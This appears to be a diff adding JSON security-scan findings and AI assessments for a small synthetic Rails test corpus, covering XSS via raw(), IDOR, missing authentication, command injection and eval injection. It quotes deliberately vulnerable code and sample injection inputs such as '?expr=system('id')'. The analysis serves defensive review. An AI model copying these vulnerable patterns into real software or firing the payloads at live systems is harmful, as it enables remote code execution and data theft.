+        "title": "Cross-site scripting via raw() on user bio in ERB template",
+        "rationale": "raw() marks @user.bio as html_safe, bypassing Rails' default ERB output escaping. A user-controlled bio containing <script> or an event-handler attribute executes in the browser of anyone viewing the profile, enabling session theft and account takeover. Contrast app/safe_view.erb, which uses plain <%= %>.",
+        "evidence": "<div class=\"profile\"><%= raw @user.bio %></div>",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-86c0885f0cec1daf",
+          "finding_id": "model-86c0885f0cec1daf",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-86c0885f0cec1daf-model-86c0885f0cec1daf-obs",
+            "ev-model-86c0885f0cec1daf-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.923456Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-86c0885f0cec1daf-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-86c0885f0cec1daf-model-86c0885f0cec1daf-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-86c0885f0cec1daf-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-86c0885f0cec1daf-ai",
+            "finding_id": "model-86c0885f0cec1daf",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": {
+              "version": "4.0",
+              "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+              "base_score": 5.1,
+              "qualitative": "medium",
+              "source": "ai-proposal",
+              "notes": "",
+              "overall_score": 5.1,
+              "base_rating": "Medium",
+              "overall_rating": "Medium",
+              "nomenclature": "CVSS-B",
+              "calculation_source": "FIRST CVSS v4.0",
+              "metric_assumptions_verified": false
+            },
+            "confidence": 0.5,
+            "assumptions": [
+              "@user.bio is populated from end-user-supplied profile input and is not sanitized at write time in code outside the eight-file snapshot.",
+              "No Content-Security-Policy or other response-level mitigation exists in the full application outside this snapshot.",
+              "The template is reachable via a route in the real application; route lookup was manifest-served and returned no route data.",
+              "Taint flow from request input to @user.bio is inferred, not observed; no controller action was available to verify it."
+            ],
+            "rationale": "Let me verify the sink semantics and check whether any other scanner tooling is functional for corroboration.\n\nRails' own documentation confirms `raw` is `to_s.html_safe` and explicitly warns against using it on user input. Let me check the remaining scanner tools for corroboration and confirm no sanitizer layer exists anywhere.\n\nWeb search is not returning useful results for the secondary queries, but the Rails API doc is authoritative for the sink semantics. Let me try the remaining scanners for corroboration.\n\nSearch is degraded. Let me confirm the OWASP Cheat Sheet Series XSS prevention page directly, which is the primary reference for the CWE-79 context.\n\nOWASP confirms the general principle: HTML-context output of untrusted data requires entity encoding, and framework escape hatches are a known XSS gap. Let me check the Rails-specific cheat sheet for the `raw` guidance.\n\nOWASP's Rails cheat sheet names this exact pattern -- `<%= raw @product.name %>` -- as \"Wrong! Do not do this!\" and states any field using `raw` is a potential XSS target. Let me try the remaining scanners for corroborating evidence.\n\nSearch remains degraded; I have sufficient primary-source confirmation. Let me make one final attempt at scanner corroboration.\n\nI have what I need. Here's my assessment.\n\n## What the code shows\n\n`app/vuln_view.erb` is a single line:\n\n```erb\n<div class=\"profile\"><%= raw @user.bio %></div>\n```\n\nThe sink is unambiguous and I verified it against primary sources rather than memory:\n\n- **Rails API docs** for `ActionView::Helpers::OutputSafetyHelper#raw` define it as `stringish.to_s.html_safe`, and the documentation itself states: *\"This method outputs without escaping a string... This is not recommended if the data is coming from the user's input.\"*\n- **OWASP Ruby on Rails Cheat Sheet** names this exact pattern -- `<%= raw @product.name %>` -- as `# Wrong! Do not do this!`, and adds that *\"any field that uses raw, html_safe or similar like this will be a potential XSS",
+            "evidence_refs": [
+              "model-86c0885f0cec1daf-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-86c0885f0cec1daf",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:54:52.221600Z",
+            "metadata": {
+              "tool_calls_made": 11,
+              "total_tokens": 50736,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "computed"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-501079420c3a0aaf",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "501079420c3a0aaf9b56759320c94dd67e5993cf65e263c058895087721a59ed",
+      "title": "Broken access control: user record lookup has no authentication or ownership scoping (IDOR)",
+      "description": "UsersController#show exposes user records selected by a client-supplied `params[:name]` and has no `before_action :authenticate_user!`, no authorization check, and no scoping to the current user. Any unauthenticated request can enumerate and retrieve other users' records. A grep across the snapshot for before_action/authenticate/authorize/current_user returned no hits, confirming no auth layer exists to compensate. The missing check is at this action.",
+      "cwe_category": "CWE-639",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-501079420c3a0aaf-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-639",
+          "severity": "high",
+          "native_severity": null,
+          "message": "UsersController#show exposes user records selected by a client-supplied `params[:name]` and has no `before_action :authenticate_user!`, no authorization check, and no scoping to the current user. Any unauthenticated request can enumerate and retrieve other users' records. A grep across the snapshot for before_action/authenticate/authorize/current_user returned no hits, confirming no auth layer exists to compensate. The missing check is at this action.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_sql.rb",
+            "language": "ruby",
+            "line_start": 2,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_sql.rb (lines 1-5) ---\n1: class UsersController < ApplicationController\n2:   def show\n3:     @users = User.where(\"name = '#{params[:name]}'\")\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.960656Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-501079420c3a0aaf-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.960656Z",
+      "updated_at": "2026-11-25T13:53:57.960656Z",
+      "metadata": {
+        "title": "Broken access control: user record lookup has no authentication or ownership scoping (IDOR)",
+        "rationale": "UsersController#show exposes user records selected by a client-supplied `params[:name]` and has no `before_action :authenticate_user!`, no authorization check, and no scoping to the current user. Any unauthenticated request can enumerate and retrieve other users' records. A grep across the snapshot for before_action/authenticate/authorize/current_user returned no hits, confirming no auth layer exists to compensate. The missing check is at this action.",
+        "evidence": "class UsersController < ApplicationController\n  def show\n    @users = User.where(\"name = '#{params[:name]}'\")",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-501079420c3a0aaf",
+          "finding_id": "model-501079420c3a0aaf",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-501079420c3a0aaf-model-501079420c3a0aaf-obs",
+            "ev-model-501079420c3a0aaf-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.923456Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-501079420c3a0aaf-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-501079420c3a0aaf-model-501079420c3a0aaf-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-501079420c3a0aaf-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-501079420c3a0aaf-ai",
+            "finding_id": "model-501079420c3a0aaf",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.5,
+            "assumptions": [
+              "ApplicationController, as defined outside the snapshot, applies no authentication or authorization filter to this action; unverified and unverifiable from the provided files.",
+              "A route exists mapping a request to UsersController#show, and it is reachable without prior authentication; no routes.rb is present in the snapshot to confirm verb, path, or constraints.",
+              "Rails' implicit render convention produces a view listing the matched users, making the records visible to the caller; the corresponding template is not in the snapshot.",
+              "The User model and its schema (including whether records contain sensitive fields) are unknown, so the sensitivity of disclosed data is not established.",
+              "The scanner's single-pattern grep result was independently reproduced; the earlier multi-pattern grep in this session returned a false negative and was discarded."
+            ],
+            "rationale": "I have what I need. One note on the scanner's stated evidence before the assessment.\n\n## Assessment\n\n**What the code does.** `app/vuln_sql.rb` is 5 lines: `UsersController#show` sets `@users = User.where(\"name = '#{params[:name]}'\")`. The lookup is keyed on a client-supplied `name`, there is no `before_action`, no `authenticate_user!`, no `authorize`/policy call, and no `current_user` scoping.\n\n**What I verified.** I read the file with `inspect_code` and confirmed the exact source. Targeted greps for `before_action`, `authenticate_user|current_user|authorize|can?|pundit|devise` returned no hits across the snapshot. A grep for `routes|resources` also returned no hits -- there is no `routes.rb` in the snapshot at all, so I could not confirm the HTTP route, verb, or path. The snapshot has 8 files total: four controllers (`safe_sql.rb`, `vuln_cmd.rb`, `vuln_eval.rb`, `vuln_sql.rb`) and four views. `ApplicationController` is referenced but never defined, so any inherited filters are invisible to me. Semgrep could not run (`semgrep not found on PATH`), and the other scanners report zero findings, so no tool independently corroborates this.\n\n**Judgment.** The access-control gap is real as written in the snapshot: nothing in the code restricts who may call `show`, and nothing ties the returned rows to the caller. But the finding overstates its own evidence in three places:\n\n1. It claims the grep \"confirmed no auth layer exists to compensate.\" Greps over 8 files cannot confirm the absence of inherited filters in an undefined `ApplicationController`, or of routing-level constraints in a `routes.rb` that is not in the snapshot. The correct statement is \"no compensating control is visible in the snapshot.\"\n2. It claims an attacker can \"enumerate and retrieve\" records. The action assigns `@users` but I see no matching view (`vuln_view.erb` renders `@user.bio` via `raw`, singular -- not this action's template), so disclosure is inferred from Rails' implicit render convention, not",
+            "evidence_refs": [
+              "model-501079420c3a0aaf-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-501079420c3a0aaf",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:55:11.893013Z",
+            "metadata": {
+              "tool_calls_made": 15,
+              "total_tokens": 51424,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-466f136d5b9cefd2",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "466f136d5b9cefd21ddb9d8494ed173222a5f587d3495ab8142980a7dea19e88",
+      "title": "Broken access control: directory listing action requires no authentication or authorization",
+      "description": "FilesController#list performs a filesystem listing and is exposed with no authentication, no authorization/role check, and no `before_action` guard anywhere in the snapshot. Unauthenticated callers can invoke the listing for arbitrary paths, and combined with the command injection at line 3 this yields unauthenticated remote command execution. The missing check is at this action.",
+      "cwe_category": "CWE-862",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-466f136d5b9cefd2-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-862",
+          "severity": "high",
+          "native_severity": null,
+          "message": "FilesController#list performs a filesystem listing and is exposed with no authentication, no authorization/role check, and no `before_action` guard anywhere in the snapshot. Unauthenticated callers can invoke the listing for arbitrary paths, and combined with the command injection at line 3 this yields unauthenticated remote command execution. The missing check is at this action.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_cmd.rb",
+            "language": "ruby",
+            "line_start": 2,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_cmd.rb (lines 1-5) ---\n1: class FilesController < ApplicationController\n2:   def list\n3:     system(\"ls \" + params[:dir])\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.962665Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-466f136d5b9cefd2-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.962665Z",
+      "updated_at": "2026-11-25T13:53:57.962665Z",
+      "metadata": {
+        "title": "Broken access control: directory listing action requires no authentication or authorization",
+        "rationale": "FilesController#list performs a filesystem listing and is exposed with no authentication, no authorization/role check, and no `before_action` guard anywhere in the snapshot. Unauthenticated callers can invoke the listing for arbitrary paths, and combined with the command injection at line 3 this yields unauthenticated remote command execution. The missing check is at this action.",
+        "evidence": "class FilesController < ApplicationController\n  def list\n    system(\"ls \" + params[:dir])",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-466f136d5b9cefd2",
+          "finding_id": "model-466f136d5b9cefd2",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-466f136d5b9cefd2-model-466f136d5b9cefd2-obs",
+            "ev-model-466f136d5b9cefd2-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.923456Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-466f136d5b9cefd2-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-466f136d5b9cefd2-model-466f136d5b9cefd2-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-466f136d5b9cefd2-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-466f136d5b9cefd2-ai",
+            "finding_id": "model-466f136d5b9cefd2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "needs_review",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.4,
+            "assumptions": [
+              "Assumed the snapshot is not the full application: no routes, ApplicationController, Gemfile, or config/ files were provided, so reachability and inherited filters cannot be determined.",
+              "Assumed the action is reachable only if a route maps to FilesController#list; this was not verifiable.",
+              "Assumed no inherited authentication filter exists in ApplicationController; this is unknown, since that class body is not in the snapshot.",
+              "Semgrep verification was not possible (binary not on PATH); CodeQL was not run, so no independent scanner corroboration was obtained.",
+              "Not assessed: whether the app enforces auth at a reverse proxy or rack middleware layer outside the snapshot."
+            ],
+            "rationale": "Source confirms app/vuln_cmd.rb defines FilesController#list with no auth/authorization logic and passes params[:dir] to system() as a single shell string. A snapshot-wide grep for before_action|authenticate|authorize|current_user|require_login returned zero hits, so no guard appears in the files present. However, the snapshot contains only eight app/ files: config/routes.rb, the ApplicationController definition, initializers and middleware are all absent. Reachability of the action is therefore unverified (lookup_route returned no route data), and the absence of a before_action cannot exclude an inherited global filter declared in the undefined ApplicationController. The CWE-862 claim is an absence-of-evidence inference over an incomplete snapshot, and the scanner's self-reported confidence of 1.0 conflicts with its own evidence_strength of 'none'. The exploitable core is the CWE-78 injection, already tracked separately; the unauthenticated escalation depends on facts not in evidence. Missing evidence is unknown, not safe.",
+            "evidence_refs": [
+              "model-466f136d5b9cefd2-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-466f136d5b9cefd2",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:55:04.144508Z",
+            "metadata": {
+              "tool_calls_made": 12,
+              "total_tokens": 54192,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-133c74cbc2a4d259",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "133c74cbc2a4d259d9e2a5f62483f4d87530ff7b7e098121019cf8c44f287084",
+      "title": "Broken access control: arbitrary expression evaluation endpoint unauthenticated",
+      "description": "CalcController#compute evaluates attacker-controlled expressions but has no authentication, authorization, or rate limiting guard. Because the endpoint has no access control at all, the eval sink is reachable by any anonymous client rather than being restricted to trusted/administrative users. The missing check is at this action.",
+      "cwe_category": "CWE-862",
+      "additional_cwe_labels": [],
+      "severity": "high",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-133c74cbc2a4d259-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-862",
+          "severity": "high",
+          "native_severity": null,
+          "message": "CalcController#compute evaluates attacker-controlled expressions but has no authentication, authorization, or rate limiting guard. Because the endpoint has no access control at all, the eval sink is reachable by any anonymous client rather than being restricted to trusted/administrative users. The missing check is at this action.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_eval.rb",
+            "language": "ruby",
+            "line_start": 2,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_eval.rb (lines 1-5) ---\n1: class CalcController < ApplicationController\n2:   def compute\n3:     render plain: eval(params[:expr])\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.964671Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-133c74cbc2a4d259-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.964671Z",
+      "updated_at": "2026-11-25T13:53:57.964671Z",
+      "metadata": {
+        "title": "Broken access control: arbitrary expression evaluation endpoint unauthenticated",
+        "rationale": "CalcController#compute evaluates attacker-controlled expressions but has no authentication, authorization, or rate limiting guard. Because the endpoint has no access control at all, the eval sink is reachable by any anonymous client rather than being restricted to trusted/administrative users. The missing check is at this action.",
+        "evidence": "class CalcController < ApplicationController\n  def compute\n    render plain: eval(params[:expr])",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-133c74cbc2a4d259",
+          "finding_id": "model-133c74cbc2a4d259",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-133c74cbc2a4d259-model-133c74cbc2a4d259-obs",
+            "ev-model-133c74cbc2a4d259-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.923456Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-133c74cbc2a4d259-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-133c74cbc2a4d259-model-133c74cbc2a4d259-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-133c74cbc2a4d259-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-133c74cbc2a4d259-ai",
+            "finding_id": "model-133c74cbc2a4d259",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.5,
+            "assumptions": [
+              "The file contents in the snapshot match the deployed application; no generated or overridden copy exists outside the snapshot.",
+              "ApplicationController is a standard Rails base class without a global before_action authentication filter; this is unverified because the file is not in the snapshot.",
+              "A route mapping to CalcController#compute exists and is publicly reachable; route lookup returned no data, so this is inferred from the controller's existence and the scan manifest's treatment of it.",
+              "The endpoint is not protected by a reverse proxy, WAF or gateway-level authentication outside the source tree.",
+              "The snapshot is a synthetic test corpus (vuln_/safe_ file pairs), so real-world exposure may differ from a production Rails app."
+            ],
+            "rationale": "I have what the snapshot can give. Here is the assessment.\n\n## What the code shows\n\n`app/vuln_eval.rb` is 5 lines and matches the observation exactly:\n\n```ruby\nclass CalcController < ApplicationController\n  def compute\n    render plain: eval(params[:expr])\n  end\nend\n```\n\n`params[:expr]` is a request parameter passed straight to `Kernel#eval` with no parsing, allowlist or sandbox, and its return value is rendered. A request like `?expr=system('id')` or `?expr=\\`whoami\\`` executes arbitrary Ruby in the Rails process. This is the primary defect: **CWE-95 (eval injection)**, which two other findings in this run (`model-1a49f19ddea57d2b`, `model-ac40b4bbf031c98f`) already capture at critical severity.\n\n## What the snapshot cannot show\n\nOn the CWE-862 claim specifically, the evidence is incomplete in both directions:\n\n- **No auth layer is visible.** A grep for `before_action`, `skip_before_action`, `authenticate`, `current_user` and `authorize` across the snapshot returned only the four `class ... < ApplicationController` declarations. `ApplicationController` itself, `config/routes.rb`, initializers and any Rack middleware are not in the snapshot, so I cannot rule out a global `before_action :authenticate_user!` or route-level constraint defined outside these files.\n- **No route is visible.** The route lookup is served from the scan manifest and returned nothing for `CalcController`, so I cannot confirm the endpoint is actually exposed at a reachable path, or with what verb.\n- **Scanner coverage was unavailable.** Semgrep and CodeQL are not on PATH in this environment (`semgrep not found`, `codeql not found`), so no independent confirmation was produced. My assessment rests on code reading of the four controller files.\n\nThe file is one of three deliberate \"vuln_\" counterparts to \"safe_\" files in a small, clearly synthetic snapshot, which suggests the missing-auth condition is by design rather than an oversight in a real application. That does not make the eval safe; it do",
+            "evidence_refs": [
+              "model-133c74cbc2a4d259-obs"
+            ],
+            "evidence_strength": "none",
+            "validation_outcome": "inconclusive",
+            "validation_decision_id": "val-model-133c74cbc2a4d259",
+            "model_id": "empero/kojo",
+            "model_version": "v1",
+            "provider_id": "kojo-bench-tmp",
+            "context_evidence_id": null,
+            "created_at": "2026-11-25T13:55:16.249548Z",
+            "metadata": {
+              "tool_calls_made": 15,
+              "total_tokens": 60592,
+              "verdict_explicit": true,
+              "cvss_validation_errors": [],
+              "cvss_score_status": "not_provided"
+            }
+          }
+        ]
+      }
+    },
+    {
+      "version": "0.1.0",
+      "finding_id": "model-1eae62911d192eb8",
+      "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+      "fingerprint": "1eae62911d192eb84ef665e75ba7ca0dd556bc6dbb1535c53a169cf27377aaa3",
+      "title": "OS command injection via user-controlled params reaching system()",
+      "description": "This file is the vulnerable counterpart to safe_cmd.rb: request parameters are interpolated into a shell command string handed to system/backticks, so shell metacharacters (;, |, $()) let an attacker run arbitrary commands. The content of the file was not read with inspect_code in this turn, so the excerpt is unverified and the line is the file's first line.",
+      "cwe_category": "CWE-78",
+      "additional_cwe_labels": [],
+      "severity": "critical",
+      "status": "unresolved",
+      "provenance": "model",
+      "observations": [
+        {
+          "version": "0.1.0",
+          "observation_id": "model-1eae62911d192eb8-obs",
+          "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+          "tool": "native-hunt",
+          "tool_version": "model-hunt",
+          "rule_id": "model-hunt",
+          "rule_pack_version": null,
+          "cwe_category": "CWE-78",
+          "severity": "critical",
+          "native_severity": null,
+          "message": "This file is the vulnerable counterpart to safe_cmd.rb: request parameters are interpolated into a shell command string handed to system/backticks, so shell metacharacters (;, |, $()) let an attacker run arbitrary commands. The content of the file was not read with inspect_code in this turn, so the excerpt is unverified and the line is the file's first line.",
+          "confidence": 1.0,
+          "location": {
+            "version": "0.1.0",
+            "file_path": "app/vuln_cmd.rb",
+            "language": "ruby",
+            "line_start": 1,
+            "line_end": null,
+            "column_start": null,
+            "column_end": null,
+            "symbol": null,
+            "snippet": "--- app/vuln_cmd.rb (lines 1-5) ---\n1: class FilesController < ApplicationController\n2:   def list\n3:     system(\"ls \" + params[:dir])\n4:   end\n5: end"
+          },
+          "dependency_identity": null,
+          "raw_output_ref": null,
+          "detected_at": "2026-11-25T13:53:57.965671Z",
+          "metadata": {
+            "model_tool": "model-hunt"
+          }
+        }
+      ],
+      "groups": [],
+      "evidence_strength": "none",
+      "evidence_refs": [
+        "model-1eae62911d192eb8-obs"
+      ],
+      "created_at": "2026-11-25T13:53:57.965671Z",
+      "updated_at": "2026-11-25T13:53:57.965671Z",
+      "metadata": {
+        "title": "OS command injection via user-controlled params reaching system()",
+        "rationale": "This file is the vulnerable counterpart to safe_cmd.rb: request parameters are interpolated into a shell command string handed to system/backticks, so shell metacharacters (;, |, $()) let an attacker run arbitrary commands. The content of the file was not read with inspect_code in this turn, so the excerpt is unverified and the line is the file's first line.",
+        "evidence": "unknown (file listed by list_files; contents not inspected in this turn)",
+        "validation_decision": {
+          "version": "0.1.0",
+          "decision_id": "val-model-1eae62911d192eb8",
+          "finding_id": "model-1eae62911d192eb8",
+          "previous_status": "unprocessed",
+          "new_status": "unresolved",
+          "outcome": "inconclusive",
+          "evidence_refs": [
+            "ev-model-1eae62911d192eb8-model-1eae62911d192eb8-obs",
+            "ev-model-1eae62911d192eb8-model"
+          ],
+          "evidence_strength": "weak",
+          "rationale": "Insufficient independent evidence. Scanner detections, model proposals and incomplete procedures do not establish confirmation or rejection.",
+          "decided_by": "independent-validator",
+          "decided_at": "2026-11-25T13:55:50.924455Z",
+          "metadata": {
+            "policy": "independent-evidence/2",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "assessment_id": "assess-model-1eae62911d192eb8-ai",
+            "supporting_evidence": [],
+            "counterevidence": [],
+            "supporting_verification": [],
+            "counter_verification": [],
+            "conflicting_ids": [],
+            "verification_outcomes": {},
+            "ignored": [
+              {
+                "id": "ev-model-1eae62911d192eb8-model-1eae62911d192eb8-obs",
+                "reason": "not independently verified supporting/counter evidence"
+              },
+              {
+                "id": "ev-model-1eae62911d192eb8-model",
+                "reason": "not independently verified supporting/counter evidence"
+              }
+            ],
+            "model_proposal_used_for_status": false
+          }
+        },
+        "ai_assessments": [
+          {
+            "version": "0.1.0",
+            "assessment_id": "assess-model-1eae62911d192eb8-ai",
+            "finding_id": "model-1eae62911d192eb8",
+            "run_id": "run-6306ce6343b040449b2b96a61b0ab7c1",
+            "proposed_status": "confirmed",
+            "proposed_severity": "undetermined",
+            "cwe_category": null,
+            "cvss": null,
+            "confidence": 0.85,
+            "assumptions": [
+              "app/vuln_cmd.rb is a live application file, not a deliberately vulnerable test fixture; it is not marked as a test file in the finding metadata and no test path indicator is present.",
+              "FilesController#list is reachable over HTTP via Rails conventional routing. No routes.rb exists in the snapshot, so this is inferred from Rails convention only and is not verified.",
+              "Authentication/authorization status is unknown. The sibling CWE-862 finding claims no before_action guard exists; grep for before_action/authenticate/require_login found no matches, but with no ApplicationController in the snapshot this does not prove the absence of a guard inherited from outside the indexed files. PR is therefore left unspecified rather than assumed to be N.",
+              "The deployed Ruby is a standard build where system with a single String argument invokes a shell; this is documented default behavior, not a platform-specific configuration.",
+              "The Rails process runs with whatever filesystem, network, and secret access the deployment grants it; SC/SI/SA are not assessed because the snapshot provides no deployment or privilege context.",
+              "Rails request parameter parsing may normalize or reject some payloads, but Ruby string concatenation into the command is unmodified, so metacharacters that survive parsing reach the shell."
+            ],
